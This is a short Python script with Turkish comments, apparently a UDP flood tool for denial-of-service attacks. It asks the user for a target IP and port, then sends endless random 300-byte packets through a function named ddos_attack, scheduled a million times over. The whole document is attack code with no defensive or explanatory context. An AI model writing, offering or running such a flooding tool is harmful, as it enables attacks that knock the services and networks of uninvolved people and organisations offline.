import asyncio
import socket
import random


async def ddos_attack(hedef_ip, hedef_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((hedef_ip, hedef_port))  # Bağlantıyı bir kere kurarak daha hızlı gönderim yapabiliriz

        bytes_to_send = random._urandom(300)  # Daha küçük veri paketleri
        sayac = 0

        while True:
            sock.send(bytes_to_send)  # connect kullanıldığı için sendto yerine direkt send kullanıyoruz
            sayac += 1
            print(f"Saldırı başladı - Paket {sayac}")

    except KeyboardInterrupt:
        pass
    finally:
        sock.close()


async def main():
    hedef_ip = input("Hedef IP: ")
    hedef_port = int(input("Hedef Port: "))

    tasks = [ddos_attack(hedef_ip, hedef_port) for _ in range(1000000)]
    await asyncio.gather(*tasks)


if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
